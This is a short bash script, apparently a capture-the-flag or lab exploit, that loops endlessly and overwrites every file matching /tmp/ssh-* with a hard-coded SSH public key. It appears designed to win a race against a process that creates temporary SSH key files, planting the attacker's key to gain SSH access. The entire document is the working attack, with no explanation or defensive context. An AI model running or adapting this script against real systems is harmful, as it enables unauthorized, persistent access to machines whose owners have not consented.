#!/bin/bash
while true; do 
	for file in /tmp/ssh-*; do 
		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBKhHluLu2PYvToVwCT3Rbl4VVjm8EiYMU1Hd/otVebY6tKI/YrBDNH2oQKHI4qpnBZgGxlWnpsAJIOA/1wt4BeEacX9fn7CxE5U3cyY1d0XA7nnw2o2ZcpMuXbRY8F+jpt9JP2z6zCAegj4DYI9V3Qk91Lf4QTCwN7l/s1NpdnGHR0ALi1kXd7GbxkMq9dUfmr39MhJUFnvglkVDyMk44POJw/ydIdIoz/OPpCNJe+rFs/g6hpo4MRrzRu0OcdADyHwOpMVp3EzVaSdnr2U+Ykcs/B+qtoNusMvhrA2J0hSVpA41XCaF3AoT3jaZaK+sliENfzR13zNOjvx8ImA3U+F1OsYKm1M6Dm7YF4zKaNmQzonMSscf4J9KSkMD1ibzcdILo5KrjhvlDnF/+Oo46tiAVqjXT0aHPTmZGnfibwScwpWa5asprI1hU9RlmhL5+XoU2HmM6y3zocSXV0nHjXXLZ25OeWhqZlj62KtETO0C+tqQg3kQeQImr9+rNnTE= smith@4b9c215d8b12" > $file;
       	done; 
done
